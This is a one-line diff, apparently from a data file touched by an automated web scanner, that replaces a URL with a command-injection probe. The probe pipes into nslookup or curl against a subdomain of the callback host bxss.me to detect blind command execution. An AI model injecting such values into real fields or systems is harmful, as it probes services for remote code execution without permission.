@@ -1,1 +1,1 @@
-http://bxss.me/t/fit.txt?.1088/0953-8984/16/27/003
+|(nslookup -q=cname hitpwmcaypnxo5ed38.bxss.me||curl hitpwmcaypnxo5ed38.bxss.me)
